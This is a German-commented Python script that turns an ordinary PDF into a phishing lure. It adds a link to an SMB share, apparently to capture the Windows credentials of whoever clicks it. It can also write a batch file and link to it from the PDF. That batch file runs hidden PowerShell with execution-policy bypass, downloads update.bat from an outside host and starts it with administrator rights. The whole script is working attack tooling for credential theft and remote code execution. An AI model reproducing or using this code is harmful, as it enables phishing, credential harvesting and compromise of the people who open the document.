#!/usr/bin/env python3
import fitz  # PyMuPDF
import argparse
import os
import traceback


def create_batch_file(batch_name):
    """Erstellt eine Batch-Datei, die die Update-Datei sicher herunterlädt und als Admin startet."""
    batch_path = os.path.abspath(batch_name)  # Absolute Pfadangabe sicherstellen

    batch_content = f"""@echo off
echo [*] Lade Update-Datei herunter...
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {{ 
    try {{ 
        Invoke-WebRequest -Uri https://sleibo-it.com/update.bat -OutFile %TEMP%\\update.bat 
        echo [*] Download erfolgreich! 
    }} catch {{ 
        echo [!] Fehler: Datei konnte nicht heruntergeladen werden. 
        exit /b 1 
    }} 
}}"

if exist %TEMP%\\update.bat (
    echo [*] Starte Update mit Admin-Rechten...
    powershell Start-Process -FilePath %TEMP%\\update.bat -Verb RunAs
) else (
    echo [!] Fehler: Update-Datei wurde nicht heruntergeladen!
    exit /b 1
)
exit
"""

    with open(batch_path, "w") as bat_file:
        bat_file.write(batch_content)

    print(f"📝 Batch-Datei erstellt: {batch_path}")
    return batch_path


def manipulate_pdf(input_pdf, output_pdf, smb_uri, batch_name=None):
    """Manipuliert das PDF und fügt die Links hinzu."""
    if not os.path.exists(input_pdf):
        print(f"❌ Fehler: Die Datei {input_pdf} existiert nicht.")
        return

    try:
        print(f"📂 Öffne PDF-Datei: {input_pdf}")
        doc = fitz.open(input_pdf)

        if doc.page_count == 0:
            print("❌ Fehler: Das PDF enthält keine Seiten!")
            return

        page = doc[0]  # Erste Seite wird manipuliert

        # Debug: SMB-Link testen
        print(f"🔗 SMB-Link: {smb_uri}")

        # Unsichtbarer SMB-Link einfügen
        rect_smb = fitz.Rect(10, 10, 50, 20)  # Klickbare Fläche
        page.insert_textbox(rect_smb, "[SMB-Zugriff]", fontsize=8, color=(0, 0, 1))  # Link sichtbar machen
        page.add_link({"kind": fitz.LINK_URI, "from": rect_smb, "uri": smb_uri})

        # Optional: Batch-Datei erstellen, wenn -b angegeben wurde
        batch_file = None
        if batch_name:
            batch_file = create_batch_file(batch_name)

            # Debug: Sicherstellen, dass der Batch-Link korrekt ist
            print(f"📂 Batch-Datei-Link: {batch_file}")

            # Unsichtbarer Link für Batch-Datei
            rect_ps = fitz.Rect(50, 100, 300, 150)  # Klickbare Fläche
            page.insert_textbox(rect_ps, "[Batch ausführen]", fontsize=8, color=(1, 0, 0))
            page.add_link({"kind": fitz.LINK_URI, "from": rect_ps, "uri": f"file:///{batch_file.replace(os.sep, '/')}"})

        # Speichere das manipulierte PDF
        print(f"💾 Speichere manipuliertes PDF unter: {output_pdf}")
        doc.save(output_pdf)
        doc.close()

        print(f"✅ Manipuliertes PDF erfolgreich gespeichert als: {output_pdf}")

    except Exception as e:
        print(f"❌ Fehler bei der Manipulation: {str(e)}")
        print(traceback.format_exc())


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PDF-Manipulator für SMB-Authentifizierung & Batch-Start (optional).")
    parser.add_argument("-t", "--target", required=True, help="Pfad zur Ziel-PDF-Datei.")
    parser.add_argument("-d", "--destination", required=True, help="Pfad für die gespeicherte manipulierte PDF.")
    parser.add_argument("-uc", "--uri_change", default=r"\\192.168.0.158\share",
                        help="Ändert die URI für SMB-Authentifizierung (Standard: \\\\192.168.0.158\\share).")
    parser.add_argument("-b", "--batch", help="Erstellt eine Batch-Datei mit dem angegebenen Namen (optional).")

    args = parser.parse_args()

    manipulate_pdf(args.target, args.destination, args.uri_change, args.batch)


